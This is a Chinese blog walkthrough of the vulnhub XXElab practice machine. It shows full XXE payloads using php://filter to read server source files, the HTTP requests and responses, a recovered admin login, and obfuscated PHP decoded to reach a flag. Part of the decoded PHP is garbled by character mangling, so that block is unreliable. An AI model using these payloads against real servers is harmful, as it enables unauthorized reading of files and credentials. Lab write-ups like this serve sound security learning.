---
title: "网安笔记 - 靶场实例 - XXE - vulnhub-XXElab"
category: "网安笔记"
date: 2026-04-09
published: 2026-04-09
author: "Rin"
---

先把虚拟机搭建起来
用nmap扫描一下网段 找到xxelab的ip
**192.168.240.132**
用dirsearch扫一下目录 发现有一个robots.txt 访问一下
```txt
User-agent: *
Allow: /

User-Agent: *
Disallow: /xxe/*
Disallow: /admin.php
```
进xxe目录看一眼 访问192.168.240.132/xxe

是一个登录页面 随便输个账号密码抓个包看看
```txt
POST /xxe/xxe.php HTTP/1.1
Host: 192.168.240.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.240.132/xxe/
Content-Length: 95
Content-Type: text/plain;charset=UTF-8
Cookie: PHPSESSID=bj15tol4qgd34nqtknorvg1kot
DNT: 1
Connection: close

<?xml version="1.0" encoding="UTF-8"?><root><name>admin</name><password>admin</password></root>
```

这是数据包 很明显是xml格式的传输 那么就构造一个xml 读他的文件看看

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ 
<!ELEMENT name ANY > 
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=xxe.php">
]> 
 <root><name>&xxe;</name><password>admin</password></root>
```

回显
```txt
Sorry, this PD9waHAKbGlieG1sX2Rpc2FibGVfZW50aXR5X2xvYWRlciAoZmFsc2UpOwokeG1sZmlsZSA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpOwokZG9tID0gbmV3IERPTURvY3VtZW50KCk7CiRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKJGluZm8gPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKJG5hbWUgPSAkaW5mby0+bmFtZTsKJHBhc3N3b3JkID0gJGluZm8tPnBhc3N3b3JkOwoKZWNobyAiU29ycnksIHRoaXMgJG5hbWUgbm90IGF2YWlsYWJsZSEiOwo/Pgo= not available!
```
把这段BASE64拿去解密一下看看
```php
<?php
libxml_disable_entity_loader (false);
$xmlfile = file_get_contents('php://input');
$dom = new DOMDocument();
$dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
$info = simplexml_import_dom($dom);
$name = $info->name;
$password = $info->password;

echo "Sorry, this $name not available!";
?>

```

没什么用 再看看admin.php 
```txt
POST /xxe/xxe.php HTTP/1.1
Host: 192.168.240.132
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://192.168.240.132/xxe/
Content-Length: 227
Content-Type: text/plain;charset=UTF-8
Cookie: PHPSESSID=bj15tol4qgd34nqtknorvg1kot
DNT: 1
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ 
<!ELEMENT name ANY > 
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">
]> 
 <root><name>&xxe;</name><password>admin</password></root>
```

回显
```txt
HTTP/1.1 200 OK
Date: Thu, 06 Nov 2025 05:05:53 GMT
Server: Apache/2.4.27 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 4447
Connection: close
Content-Type: text/html; charset=UTF-8

Sorry, this PD9waHAKICAgc2Vzc2lvbl9zdGFydCgpOwo/PgoKCjxodG1sIGxhbmcgPSAiZW4iPgogICAKICAgPGhlYWQ+CiAgICAgIDx0aXRsZT5hZG1pbjwvdGl0bGU+CiAgICAgIDxsaW5rIGhyZWYgPSAiY3NzL2Jvb3RzdHJhcC5taW4uY3NzIiByZWwgPSAic3R5bGVzaGVldCI+CiAgICAgIAogICAgICA8c3R5bGU+CiAgICAgICAgIGJvZHkgewogICAgICAgICAgICBwYWRkaW5nLXRvcDogNDBweDsKICAgICAgICAgICAgcGFkZGluZy1ib3R0b206IDQwcHg7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICNBREFCQUI7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiB7CiAgICAgICAgICAgIG1heC13aWR0aDogMzMwcHg7CiAgICAgICAgICAgIHBhZGRpbmc6IDE1cHg7CiAgICAgICAgICAgIG1hcmdpbjogMCBhdXRvOwogICAgICAgICAgICBjb2xvcjogIzAxNzU3MjsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIC5mb3JtLXNpZ25pbi1oZWFkaW5nLAogICAgICAgICAuZm9ybS1zaWduaW4gLmNoZWNrYm94IHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIC5jaGVja2JveCB7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiBub3JtYWw7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiAuZm9ybS1jb250cm9sIHsKICAgICAgICAgICAgcG9zaXRpb246IHJlbGF0aXZlOwogICAgICAgICAgICBoZWlnaHQ6IGF1dG87CiAgICAgICAgICAgIC13ZWJraXQtYm94LXNpemluZzogYm9yZGVyLWJveDsKICAgICAgICAgICAgLW1vei1ib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgICAgICBmb250LXNpemU6IDE2cHg7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiAuZm9ybS1jb250cm9sOmZvY3VzIHsKICAgICAgICAgICAgei1pbmRleDogMjsKICAgICAgICAgfQogICAgICAgICAKICAgICAgICAgLmZvcm0tc2lnbmluIGlucHV0W3R5cGU9ImVtYWlsIl0gewogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAtMXB4OwogICAgICAgICAgICBib3JkZXItYm90dG9tLXJpZ2h0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLWJvdHRvbS1sZWZ0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiMwMTc1NzI7CiAgICAgICAgIH0KICAgICAgICAgCiAgICAgICAgIC5mb3JtLXNpZ25pbiBpbnB1dFt0eXBlPSJwYXNzd29yZCJdIHsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMTBweDsKICAgICAgICAgICAgYm9yZGVyLXRvcC1sZWZ0LXJhZGl1czogMDsKICAgICAgICAgICAgYm9yZGVyLXRvcC1yaWdodC1yYWRpdXM6IDA7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjojMDE3NTcyOwogICAgICAgICB9CiAgICAgICAgIAogICAgICAgICBoMnsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICBjb2xvcjogIzAxNzU3MjsKICAgICAgICAgfQogICAgICA8L3N0eWxlPgogICAgICAKICAgPC9oZWFkPgoJCiAgIDxib2R5PgogICAgICAKICAgICAgPGgyPkVudGVyIFVzZXJuYW1lIGFuZCBQYXNzd29yZDwvaDI+IAogICAgICA8ZGl2IGNsYXNzID0gImNvbnRhaW5lciBmb3JtLXNpZ25pbiI+CiAgICAgICAgIAogICAgICAgICA8P3BocAogICAgICAgICAgICAkbXNnID0gJyc7CiAgICAgICAgICAgIGlmIChpc3NldCgkX1BPU1RbJ2xvZ2luJ10pICYmICFlbXB0eSgkX1BPU1RbJ3VzZXJuYW1lJ10pIAogICAgICAgICAgICAgICAmJiAhZW1wdHkoJF9QT1NUWydwYXNzd29yZCddKSkgewoJCQkJCiAgICAgICAgICAgICAgIGlmICgkX1BPU1RbJ3VzZXJuYW1lJ10gPT0gJ2FkbWluaXN0aGViZXN0JyAmJiAKICAgICAgICAgICAgICAgICAgbWQ1KCRfUE9TVFsncGFzc3dvcmQnXSkgPT0gJ2U2ZTA2MTgzODg1NmJmNDdlMWRlNzMwNzE5ZmIyNjA5JykgewogICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3ZhbGlkJ10gPSB0cnVlOwogICAgICAgICAgICAgICAgICAkX1NFU1NJT05bJ3RpbWVvdXQnXSA9IHRpbWUoKTsKICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWyd1c2VybmFtZSddID0gJ2FkbWluaXN0aGViZXN0JzsKICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBlY2hvICJZb3UgaGF2ZSBlbnRlcmVkIHZhbGlkIHVzZSBuYW1lIGFuZCBwYXNzd29yZCA8YnIgLz4iOwoJCSRmbGFnID0gIkhlcmUgaXMgdGhlIDxhIHN0eWxlPSdjb2xvcjpGRjAwMDA7JyBocmVmPScvZmxhZ21lb3V0LnBocCc+RmxhZzwvYT4iOwoJCWVjaG8gJGZsYWc7CiAgICAgICAgICAgICAgIH1lbHNlIHsKICAgICAgICAgICAgICAgICAgJG1zZyA9ICdNYXliZSBMYXRlcic7CiAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICA/PgogICAgICA8L2Rpdj4gPCEtLSBXMDB0L1cwMHQgLS0+CiAgICAgIAogICAgICA8ZGl2IGNsYXNzID0gImNvbnRhaW5lciI+CiAgICAgIAogICAgICAgICA8Zm9ybSBjbGFzcyA9ICJmb3JtLXNpZ25pbiIgcm9sZSA9ICJmb3JtIiAKICAgICAgICAgICAgYWN0aW9uID0gIjw/cGhwIGVjaG8gaHRtbHNwZWNpYWxjaGFycygkX1NFUlZFUlsnUEhQX1NFTEYnXSk7IAogICAgICAgICAgICA/PiIgbWV0aG9kID0gInBvc3QiPgogICAgICAgICAgICA8aDQgY2xhc3MgPSAiZm9ybS1zaWduaW4taGVhZGluZyI+PD9waHAgZWNobyAkbXNnOyA/PjwvaDQ+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlID0gInRleHQiIGNsYXNzID0gImZvcm0tY29udHJvbCIgCiAgICAgICAgICAgICAgIG5hbWUgPSAidXNlcm5hbWUiIAogICAgICAgICAgICAgICByZXF1aXJlZCBhdXRvZm9jdXM+PC9icj4KICAgICAgICAgICAgPGlucHV0IHR5cGUgPSAicGFzc3dvcmQiIGNsYXNzID0gImZvcm0tY29udHJvbCIKICAgICAgICAgICAgICAgbmFtZSA9ICJwYXNzd29yZCIgcmVxdWlyZWQ+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3MgPSAiYnRuIGJ0bi1sZyBidG4tcHJpbWFyeSBidG4tYmxvY2siIHR5cGUgPSAic3VibWl0IiAKICAgICAgICAgICAgICAgbmFtZSA9ICJsb2dpbiI+TG9naW48L2J1dHRvbj4KICAgICAgICAgPC9mb3JtPgoJCQkKICAgICAgICAgQ2xpY2sgaGVyZSB0byBjbGVhbiA8YSBocmVmID0gImFkbWlubG9nLnBocCIgdGl0ZSA9ICJMb2dvdXQiPlNlc3Npb24uCiAgICAgICAgIAogICAgICA8L2Rpdj4gCiAgICAgIAogICA8L2JvZHk+CjwvaHRtbD4K not available!
```

```php
<?php
   session_start();
?>


<html lang = "en">
   
   <head>
      <title>admin</title>
      <link href = "css/bootstrap.min.css" rel = "stylesheet">
      
      <style>
         body {
            padding-top: 40px;
            padding-bottom: 40px;
            background-color: #ADABAB;
         }
         
         .form-signin {
            max-width: 330px;
            padding: 15px;
            margin: 0 auto;
            color: #017572;
         }
         
         .form-signin .form-signin-heading,
         .form-signin .checkbox {
            margin-bottom: 10px;
         }
         
         .form-signin .checkbox {
            font-weight: normal;
         }
         
         .form-signin .form-control {
            position: relative;
            height: auto;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            padding: 10px;
            font-size: 16px;
         }
         
         .form-signin .form-control:focus {
            z-index: 2;
         }
         
         .form-signin input[type="email"] {
            margin-bottom: -1px;
            border-bottom-right-radius: 0;
            border-bottom-left-radius: 0;
            border-color:#017572;
         }
         
         .form-signin input[type="password"] {
            margin-bottom: 10px;
            border-top-left-radius: 0;
            border-top-right-radius: 0;
            border-color:#017572;
         }
         
         h2{
            text-align: center;
            color: #017572;
         }
      </style>
      
   </head>
	
   <body>
      
      <h2>Enter Username and Password</h2> 
      <div class = "container form-signin">
         
         <?php
            $msg = '';
            if (isset($_POST['login']) && !empty($_POST['username']) 
               && !empty($_POST['password'])) {
				
               if ($_POST['username'] == 'administhebest' && 
                  md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609') {
                  $_SESSION['valid'] = true;
                  $_SESSION['timeout'] = time();
                  $_SESSION['username'] = 'administhebest';
                  
                echo "You have entered valid use name and password <br />";
		$flag = "Here is the <a style='color:FF0000;' href='/flagmeout.php'>Flag</a>";
		echo $flag;
               }else {
                  $msg = 'Maybe Later';
               }
            }
         ?>
      </div> <!-- W00t/W00t -->
      
      <div class = "container">
      
         <form class = "form-signin" role = "form" 
            action = "<?php echo htmlspecialchars($_SERVER['PHP_SELF']); 
            ?>" method = "post">
            <h4 class = "form-signin-heading"><?php echo $msg; ?></h4>
            <input type = "text" class = "form-control" 
               name = "username" 
               required autofocus></br>
            <input type = "password" class = "form-control"
               name = "password" required>
            <button class = "btn btn-lg btn-primary btn-block" type = "submit" 
               name = "login">Login</button>
         </form>
			
         Click here to clean <a href = "adminlog.php" tite = "Logout">Session.
         
      </div> 
      
   </body>
</html>

```

拿下管理员账号密码
```php
if ($_POST['username'] == 'administhebest' && 
                  md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609')
```

```txt
administhebest
admin@123
```

**这里是admin.php查询到的登录账号和密码 我们要访问/xxe/admin.php登录**

进入之后有一个超链接显示Flag 点进去发现报错The requested URL /flagmeout.php was not found on this server.
那么我们再用XXE漏洞读取flagmeout.php看看

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xxe [ 
<!ELEMENT name ANY > 
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=./flagmeout.php">
]> 
 <root><name>&xxe;</name><password>admin</password></root>
```

**这里读取的是根目录 因为报错flagmeout没有在这个目录中 那么我猜测应该是在根目录**

```txt
HTTP/1.1 200 OK
Date: Thu, 06 Nov 2025 05:26:33 GMT
Server: Apache/2.4.27 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 147
Connection: close
Content-Type: text/html; charset=UTF-8

Sorry, this PD9waHAKJGZsYWcgPSAiPCEtLSB0aGUgZmxhZyBpbiAoSlFaRk1NQ1pQRTRIS1dUTlBCVUZVNkpWTzVRVVFRSjUpIC0tPiI7CmVjaG8gJGZsYWc7Cj8+Cg== not available!
```

以上是回显 解密一下


```txt
<?php
$flag = "<!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) -->";
echo $flag;
?>

```

flag里的东西是base32加密 再拿去解密一下

```txt
L2V0Yy8uZmxhZy5waHA=
```

还是base64

```txt
/etc/.flag.php
```

读取一下这个文件

```txt
HTTP/1.1 200 OK
Date: Thu, 06 Nov 2025 05:28:58 GMT
Server: Apache/2.4.27 (Ubuntu)
Vary: Accept-Encoding
Content-Length: 1275
Connection: close
Content-Type: text/html; charset=UTF-8


Sorry, this JF9bXSsrOyRfW109JF8uXzskX19fX189JF9bKCsrJF9fW10pXVsoKyskX19bXSkrKCsrJF9fW10pKygrKyRfX1tdKV07JF89JF9bJF9bK19dXTskX19fPSRfXz0kX1srKyRfX1tdXTskX19fXz0kXz0kX1srX107JF8rKzskXysrOyRfKys7JF89JF9fX18uKyskX19fLiRfX18uKyskXy4kX18uKyskX19fOyRfXz0kXzskXz0kX19fX187JF8rKzskXysrOyRfKys7JF8rKzskXysrOyRfKys7JF8rKzskXysrOyRfKys7JF8rKzskX19fPStfOyRfX18uPSRfXzskX19fPSsrJF9eJF9fX1srX107JMOAPStfOyTDgT0kw4I9JMODPSTDhD0kw4Y9JMOIPSTDiT0kw4o9JMOLPSsrJMOBW107JMOCKys7JMODKys7JMODKys7JMOEKys7JMOEKys7JMOEKys7JMOGKys7JMOGKys7JMOGKys7JMOGKys7JMOIKys7JMOIKys7JMOIKys7JMOIKys7JMOIKys7JMOJKys7JMOJKys7JMOJKys7JMOJKys7JMOJKys7JMOJKys7JMOKKys7JMOKKys7JMOKKys7JMOKKys7JMOKKys7JMOKKys7JMOKKys7JMOLKys7JMOLKys7JMOLKys7JMOLKys7JMOLKys7JMOLKys7JMOLKys7JF9fKCckXz0iJy4kX19fLiTDgS4kw4IuJMODLiRfX18uJMOBLiTDgC4kw4EuJF9fXy4kw4EuJMOALiTDiC4kX19fLiTDgS4kw4AuJMODLiRfX18uJMOBLiTDgi4kw4MuJF9fXy4kw4EuJMOCLiTDgC4kX19fLiTDgS4kw4kuJMODLiRfX18uJMOBLiTDiS4kw4AuJF9fXy4kw4EuJMOJLiTDgC4kX19fLiTDgS4kw4QuJMOGLiRfX18uJMOBLiTDgy4kw4kuJF9fXy4kw4EuJMOGLiTDgS4kX19fLiTDgS4kw4guJMODLiRfX18uJMOBLiTDgy4kw4kuJF9fXy4kw4EuJMOILiTDgy4kX19fLiTDgS4kw4YuJMOJLiRfX18uJMOBLiTDgy4kw4kuJF9fXy4kw4EuJMOELiTDhi4kX19fLiTDgS4kw4QuJMOBLiRfX18uJMOBLiTDiC4kw4MuJF9fXy4kw4EuJMOJLiTDgS4kX19fLiTDgS4kw4kuJMOGLiciJyk7JF9fKCRfKTsK not available!
```

解密
```txt
$_[]++;$_[]=$_._;$_____=$_[(++$__[])][(++$__[])+(++$__[])+(++$__[])];$_=$_[$_[+_]];$___=$__=$_[++$__[]];$____=$_=$_[+_];$_++;$_++;$_++;$_=$____.++$___.$___.++$_.$__.++$___;$__=$_;$_=$_____;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=+_;$___.=$__;$___=++$_^$___[+_];$Ã=+_;$Ã=$Ã=$Ã=$Ã=$Ã=$Ã=$Ã=$Ã=$Ã=++$Ã[];$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$Ã++;$__('$_="'.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.$___.$Ã.$Ã.$Ã.'"');$__($_);


```


这玩意是php的自增代码 拿去php环境运行一下就好了 报错能看到flag内容

**要php5才能跑起来**